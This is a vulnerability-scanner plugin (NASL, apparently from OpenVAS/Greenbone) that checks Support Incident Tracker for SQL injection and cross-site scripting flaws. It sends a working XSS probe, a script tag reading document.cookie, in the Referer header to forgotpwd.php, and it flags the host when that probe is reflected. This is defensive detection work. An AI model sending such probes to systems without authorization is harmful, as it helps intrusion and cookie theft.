if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.802388" );
	script_version( "2019-12-05T15:10:00+0000" );
	script_cve_id( "CVE-2011-5071", "CVE-2011-5072", "CVE-2011-5073", "CVE-2011-5074", "CVE-2011-5075" );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_tag( name: "last_modification", value: "2019-12-05 15:10:00 +0000 (Thu, 05 Dec 2019)" );
	script_tag( name: "creation_date", value: "2012-02-01 15:15:30 +0530 (Wed, 01 Feb 2012)" );
	script_name( "Support Incident Tracker SiT! Multiple SQL Injection And XSS Vulnerabilities" );
	script_xref( name: "URL", value: "http://secunia.com/advisories/46019" );
	script_xref( name: "URL", value: "http://sitracker.org/wiki/ReleaseNotes365" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/archive/1/519636" );
	script_xref( name: "URL", value: "https://www.htbridge.ch/advisory/multiple_vulnerabilities_in_sit_support_incident_tracker.html" );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (c) 2012 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_dependencies( "support_incident_tracker_detect.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "sit/installed" );
	script_tag( name: "impact", value: "Successful exploitation will allow attacker to execute arbitrary HTML and
  script code in a user's browser session in the context of a vulnerable site
  and to cause SQL Injection attack to gain sensitive information." );
	script_tag( name: "affected", value: "Support Incident Tracker before version 3.65." );
	script_tag( name: "insight", value: "The flaws are due to improper input validation errors in multiple
  scripts before being used in SQL queries and also allows attackers to
  execute arbitrary HTML." );
	script_tag( name: "solution", value: "Upgrade to the Support Incident Tracker version 3.65 or later." );
	script_tag( name: "summary", value: "This host is running Support Incident Tracker and is prone to
  multiple sql injection and cross-site scripting vulnerabilities." );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("host_details.inc.sc");
CPE = "cpe:/a:sitracker:support_incident_tracker";
if(!sitPort = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: sitPort )){
	exit( 0 );
}
host = http_host_name( port: sitPort );
url = dir + "/forgotpwd.php?userid=1&action=sendpwd";
req = NASLString( "GET ", url, " HTTP/1.1\\r\\n", "Host: ", host, "\\r\\n", "Referer: '<script>alert(document.cookie);</script>\\r\\n", "Authorization: Basic bGFtcHA6\\r\\n\\r\\n" );
res = http_keepalive_send_recv( port: sitPort, data: req );
if(ereg( pattern: "^HTTP/[0-9]\\.[0-9] 200 .*", string: res ) && ContainsString( res, "<script>alert(document.cookie);</script>" )){
	security_message( port: sitPort, data: "The target host was found to be vulnerable." );
	exit( 0 );
}
exit( 99 );

